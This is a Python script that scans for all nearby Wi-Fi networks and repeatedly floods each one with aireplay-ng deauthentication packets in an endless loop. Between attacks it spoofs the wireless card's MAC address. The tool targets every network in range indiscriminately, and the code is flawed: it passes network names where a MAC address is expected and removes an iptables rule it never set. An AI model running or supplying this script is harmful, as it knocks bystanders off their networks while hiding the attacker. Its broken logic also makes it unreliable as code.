import subprocess
import time
import random
import os

class Deauth:
    def random_mac(self) -> str:
        return ":".join([hex(random.randint(0x00, 0xff))[2:].zfill(2) for _ in range(6)])

    def deauth_all(self) -> None:
        output: bytes = subprocess.check_output(['iwlist', 'wlan0', 'scan'])
        networks: list[bytes] = [line.split(b':')[1].strip() for line in output.split(b'\n') if b'ESSID' in line]
        
        for network in networks:
            print("[LOG] ", network)
            subprocess.call(['iwconfig', 'wlan0', 'mode', 'monitor'])
            subprocess.call(['ifconfig', 'wlan0', 'down'])
            subprocess.call(['macchanger', '-m', self.random_mac(), 'wlan0'])
            subprocess.call(['ifconfig', 'wlan0', 'up'])
            subprocess.call(['aireplay-ng', '-0', '0', '-a', network, '-c', 'FF:FF:FF:FF:FF:FF', 'wlan0'])
            subprocess.call(['iwconfig', 'wlan0', 'mode', 'managed'])
            subprocess.call(['ifconfig', 'wlan0', 'down'])
            subprocess.call(['macchanger', '-p', 'wlan0'])
            subprocess.call(['ifconfig', 'wlan0', 'up'])
        time.sleep(1)

def infcount():
    while True:
        yield

if __name__ == "__main__":
    deauth = Deauth()
    try:
        for _ in infcount():
            deauth.deauth_all()
    except KeyboardInterrupt:
        # Restore iptables rules before exiting
        subprocess.call(['iptables', '-D', 'INPUT', '-p', 'icmp', '--icmp-type', '13', '-j', 'DROP'])
